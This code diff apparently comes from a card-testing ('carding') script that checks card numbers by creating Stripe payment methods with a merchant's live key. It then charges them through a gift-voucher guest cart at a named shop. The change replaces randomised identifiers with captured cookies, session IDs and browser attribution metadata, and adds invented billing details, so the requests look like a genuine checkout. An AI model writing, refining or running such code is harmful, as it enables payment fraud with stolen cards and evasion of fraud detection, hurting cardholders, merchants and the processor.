@@ -146,7 +146,7 @@ STRIPE_SITES = [
 
 # Stripe Charge configuration
 SC_STRIPE_PK = "pk_live_51IAvn9FuKmfQdziff1ZttUVotdtFS65Bh6lfVfWRCL8K0GXOCvOosDt45XyI2c03kiZpPNUrAvxGLyIUp6BmJqSh00ExuNocOq"
-SC_COOKIES = "PHPSESSID=gk3hon1o2cevcq68frr473aqeh; X-Magento-Vary=1f62c8352e88c8b48b0f3c3c248d16c7dfafdeeb10e393475420db9df175a2fe; form_key=ay1R92X0rV5sYabB; mage-cache-storage={}; mage-cache-sessid=true; __stripe_mid=c0b7bddc-ec46-4761-8fab-f25617de6e5099c075; __stripe_sid=3c25fcc1-c225-49fe-8122-9a07ea04c5b2f380c1"
+SC_COOKIES = "PHPSESSID=gk3hon1o2cevcq68frr473aqeh; X-Magento-Vary=1f62c8352e88c8b48b0f3c3c248d16c7dfafdeeb10e393475420db9df175a2fe; _pk_ref.6.9cad=%5B%22%22%2C%22%22%2C1774534974%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_id.6.9cad=ea5beb8f9916f16c.1774534974.; _pk_ses.6.9cad=1; _pk_ref.9.9cad=%5B%22%22%2C%22%22%2C1774534974%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_id.9.9cad=ae3ee8a948e4e3ae.1774534974.; _pk_ses.9.9cad=1; STUID=329c380b-8d31-b4eb-7c03-6927fef39ea9; STVID=3ea98872-73ca-7255-7359-a25ce1f53694; _ALGOLIA=anonymous-da5f0574-0ac1-4151-b257-21fcf12a851c; form_key=ay1R92X0rV5sYabB; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; __stripe_mid=c0b7bddc-ec46-4761-8fab-f25617de6e5099c075; __stripe_sid=3c25fcc1-c225-49fe-8122-9a07ea04c5b2f380c1; _ga=GA1.1.765664538.1774534977; cookie_consent=%7B%22groups%22%3A%5B%22necessary%22%2C%22marketing%22%2C%22analytics%22%5D%2C%22rejected%22%3A%5B%5D%2C%22date%22%3A1774534977639%7D; wp_ga4_customerGroup=NOT%20LOGGED%20IN; _gcl_au=1.1.452242132.1774534983; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; mage-messages=%5B%7B%22type%22%3A%22success%22%2C%22text%22%3A%22%5CnYou%20added%20Manner%20digital%20gift%20voucher%20-%20email%20delivery%20to%20your%20%3Ca%20href%3D%5C%22https%3A%5C%2F%5C%2Fshop.manner.com%5C%2Fman_int%5C%2Fcheckout%5C%2Fcart%5C%2F%5C%22%3Eshopping%20cart%3C%5C%2Fa%3E.%22%7D%5D; amzn-checkout-session={}; _ga_QK5V5KEW9J=GS2.1.s1774534977$o1$g1$t1774535093$j36$l0$h0; private_content_version=78674ee4873e001f2c3d0c79d462c30f; section_data_ids={%22cart%22:1774535142%2C%22directory-data%22:1774535066%2C%22wp_ga4%22:1774535142%2C%22messages%22:1774535142%2C%22captcha%22:1774535142}; _ga_9GBVNR2THC=GS2.1.s1774534977$o1$g1$t1774535142$j60$l0$h1143946914"
 SC_CART_ID = "7KF6aKF4nYnlxCdFDS86kPsKyqbTQfuk"
 SC_MERCHANT_URL = "https://shop.manner.com"
 sc_mass_running = False
@@ -678,14 +678,7 @@ def get_stripe_hits():
 
 def sc_create_payment_method(card_number, exp_month, exp_year, cvc):
     url = "https://api.stripe.com/v1/payment_methods"
-    payload = {
-        "type": "card",
-        "card[number]": card_number,
-        "card[cvc]": cvc,
-        "card[exp_year]": exp_year,
-        "card[exp_month]": exp_month,
-        "card[networks][preferred]": "visa",
-        "allow_redisplay": "unspecified",
+    billing_details = {
         "billing_details[address][state]": "CA",
         "billing_details[address][postal_code]": "10080",
         "billing_details[address][country]": "US",
@@ -695,23 +688,45 @@ def sc_create_payment_method(card_number, exp_month, exp_year, cvc):
         "billing_details[email]": "crimsonkelcie@dollicons.com",
         "billing_details[name]": "david wyen",
         "billing_details[phone]": "2018379272",
+    }
+    card_details = {
+        "type": "card",
+        "card[number]": card_number,
+        "card[cvc]": cvc,
+        "card[exp_year]": exp_year,
+        "card[exp_month]": exp_month,
+        "card[networks][preferred]": "visa",
+        "allow_redisplay": "unspecified",
+    }
+    metadata = {
         "payment_user_agent": "stripe.js/34f0acd152; stripe-js-v3/34f0acd152; payment-element; deferred-intent; autopm",
         "referrer": SC_MERCHANT_URL,
-        "time_on_page": str(random.randint(30000, 120000)),
-        "guid": str(uuid.uuid4()),
-        "muid": str(uuid.uuid4()),
-        "sid": str(uuid.uuid4()),
+        "time_on_page": "81542",
+        "client_attribution_metadata[client_session_id]": "56bc9fdd-571a-4524-b12e-8e31054460c1",
+        "client_attribution_metadata[merchant_integration_source]": "elements",
+        "client_attribution_metadata[merchant_integration_subtype]": "payment-element",
+        "client_attribution_metadata[merchant_integration_version]": "2021",
+        "client_attribution_metadata[payment_intent_creation_flow]": "deferred",
+        "client_attribution_metadata[payment_method_selection_flow]": "automatic",
+        "client_attribution_metadata[elements_session_id]": "elements_session_1RmfY7HFnW1",
+        "client_attribution_metadata[elements_session_config_id]": "e5e55c55-cf30-4a8a-9922-a91a4bda1166",
+        "client_attribution_metadata[merchant_integration_additional_elements][0]": "payment",
+        "guid": "9923e39b-c3e0-4a52-9538-5029dd8914e6776df0",
+        "muid": "c0b7bddc-ec46-4761-8fab-f25617de6e5099c075",
+        "sid": "3c25fcc1-c225-49fe-8122-9a07ea04c5b2f380c1",
         "key": SC_STRIPE_PK,
         "_stripe_version": "2025-08-27.basil",
     }
+    payload = {**billing_details, **card_details, **metadata}
     headers = {
+        "authority": "api.stripe.com",
         "accept": "application/json",
         "content-type": "application/x-www-form-urlencoded",
         "origin": "https://js.stripe.com",
         "referer": "https://js.stripe.com/",
         "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
     }
-    return http_session.post(url, data=payload, headers=headers, timeout=REQUEST_TIMEOUT)
+    return requests.post(url, data=payload, headers=headers, timeout=REQUEST_TIMEOUT)
 
 def sc_send_payment(pm_id):
     url = f"{SC_MERCHANT_URL}/man_int/rest/man_int/V1/guest-carts/{SC_CART_ID}/payment-information"
@@ -742,7 +757,7 @@ def sc_send_payment(pm_id):
         "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
         "x-requested-with": "XMLHttpRequest"
     }
-    return http_session.post(url, json=payload, headers=headers, timeout=REQUEST_TIMEOUT)
+    return requests.post(url, json=payload, headers=headers, timeout=REQUEST_TIMEOUT)
 
 def check_stripe_charge(cc, month, year, cvv):
     start_time = time.time()
